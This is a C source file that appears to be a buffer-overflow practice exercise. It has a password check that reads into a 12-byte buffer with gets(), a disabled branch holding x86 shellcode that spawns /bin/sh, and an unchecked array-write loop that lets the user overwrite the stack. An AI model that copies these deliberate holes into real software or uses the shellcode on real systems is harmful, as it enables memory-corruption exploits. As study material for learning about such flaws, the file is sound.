#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>


#if 1

//test  begin------------------------->

int p(int num)
{
    int i = num;
    printf("in %s : i = %d\n", __func__, i);
}

int IsPasswordOkay(void)
{
    char Password[12];
   
    p(2);
    
    gets(Password);

    
    if(!strcmp(Password, "goodpass"))
            return 0;

    return -1;
}



static void sig_handle(int signo)                  
{                                                             
	if(SIGINT == signo)                             
		{                                                     
		printf("signal SIGINT. \n");                
		}   
	else if(SIGTSTP == signo)                    
		{                                                     
		printf("signal SIGTSTP. \n");              
		}   
	else if(SIGTERM == signo)                    
		{                                                     
		printf("signal SIGTERM. \n");              
		}
      else if(SIGUSR1 == signo)
		{                                                     
		printf("signal SIGUSR1~~. \n");              
		}        
}                                                             

int sig_match(void)                  
{  
	if((signal(SIGINT, sig_handle)) == SIG_ERR)          
		{                                                                      
		perror("Failed for signal SIGINT ");         
		return -1; 
		}    
    
	if((signal(SIGTSTP, sig_handle)) == SIG_ERR)        
		{                                                                      
		perror("Failed for signal SIGTSTP ");        
		return -1; 
		}    
    
	if((signal(SIGTERM, sig_handle)) == SIG_ERR)          
		{                                                                      
		perror("Failed for signal SIGTERM ");         
		return -1; 
		}    

    	if((signal(SIGUSR1, sig_handle)) == SIG_ERR)          
		{                                                                      
		perror("Failed for signal SIGUSR1 ");         
		return -1; 
		}    

	return 0;
}    



//test end<--------------------------



int PwStatus;
  
int  main(void)
{
  
    sig_match();
    
    puts("Enter password:");
    

    PwStatus = IsPasswordOkay();

    int n = 10;
    while(n--)
        {
        printf("5-%d\n", n);
        sleep(1);
        }
    
    if(PwStatus == -1)
        {   
         puts("Access denied");
         exit(-1);
        }
    else
        puts("Access granted");

    

    return 0;
}

#else

char shellcode[] =
    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
    "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
    "\x80\xe8\xdc\xff\xff\xff/bin/sh";

int test()
{
    int i;
    unsigned int stack[10];
    char my_str[16];
    printf("addr of shellcode in decimal: %d\n", &shellcode);
    for (i = 0; i < 10; i++)
        stack[i] = 0;

    while (1) {
        printf("index of item to fill: (-1 to quit): ");
        scanf("%d",&i);
        if (i == -1) {
            break;
        }
        printf("value of item[%d]:", i);
        scanf("%d",&stack[i]);
    }

    return 0;
}

int main()
{
    test();
    printf("Overflow Failed\n");

    return 0;
}


#endif

